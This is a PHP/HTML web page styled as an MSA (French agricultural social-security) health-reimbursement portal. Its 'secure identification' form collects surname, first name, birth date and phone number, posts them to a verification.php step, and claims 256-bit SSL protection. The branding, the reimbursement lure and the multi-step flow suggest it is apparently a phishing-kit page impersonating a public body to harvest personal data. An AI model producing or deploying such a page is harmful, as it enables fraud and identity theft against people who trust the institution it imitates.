<?php
session_start();
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MSA - Portail Remboursement</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --msa-blue: #0056b3;
            --msa-dark-blue: #003366;
            --msa-green: #008a43;
            --msa-light-gray: #f5f7fa;
        }
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background-color: var(--msa-light-gray);
            background-image: url('msa-bg.jpg');
            background-size: cover;
        }
        .msa-container {
            max-width: 800px;
            margin: 40px auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        .msa-header {
            background: linear-gradient(135deg, var(--msa-blue), var(--msa-dark-blue));
            color: white;
            padding: 30px;
            text-align: center;
            position: relative;
        }
        .msa-logo {
            height: 60px;
            margin-bottom: 15px;
        }
        .msa-form {
            padding: 30px;
        }
        .msa-form-group {
            margin-bottom: 25px;
        }
        .msa-form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
        }
        .msa-form-control {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            transition: all 0.3s;
        }
        .msa-form-control:focus {
            border-color: var(--msa-blue);
            box-shadow: 0 0 0 3px rgba(0, 86, 179, 0.1);
            outline: none;
        }
        .msa-btn {
            background: var(--msa-green);
            color: white;
            border: none;
            padding: 16px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            font-weight: 500;
            margin-top: 10px;
            transition: all 0.3s;
        }
        .msa-btn:hover {
            background: #007a3a;
            transform: translateY(-2px);
        }
        .msa-security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            color: #666;
        }
        .msa-security-badge img {
            height: 30px;
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="msa-container">
        <div class="msa-header">
            <img src="msa-logo.png" alt="MSA France" class="msa-logo">
            <h1>Portail de Remboursement Santé</h1>
        </div>
        
        <div class="msa-form">
            <h2 style="color: var(--msa-dark-blue); margin-top: 0;">Identification Sécurisée</h2>
            <p style="color: #666; margin-bottom: 25px;">Veuillez vérifier votre identité pour accéder à votre dossier</p>
            
            <form action="verification.php" method="post">
                <div class="msa-form-group">
                    <label for="nom">Nom de famille</label>
                    <input type="text" id="nom" name="nom" class="msa-form-control" required>
                </div>
                
                <div class="msa-form-group">
                    <label for="prenom">Prénom</label>
                    <input type="text" id="prenom" name="prenom" class="msa-form-control" required>
                </div>
                
                <div class="msa-form-group">
                    <label for="birthdate">Date de naissance</label>
                    <input type="date" id="birthdate" name="birthdate" class="msa-form-control" required>
                </div>
                
                <div class="msa-form-group">
                    <label for="phone">Numéro de téléphone</label>
                    <input type="tel" id="phone" name="phone" class="msa-form-control" placeholder="06 12 34 56 78" required>
                </div>
                
                <button type="submit" class="msa-btn">Continuer vers la vérification</button>
            </form>
            
            <div class="msa-security-badge">
                <img src="msa-secure.png" alt="Sécurité">
                <span>Vos informations sont protégées par chiffrement SSL 256 bits</span>
            </div>
        </div>
    </div>
</body>
</html>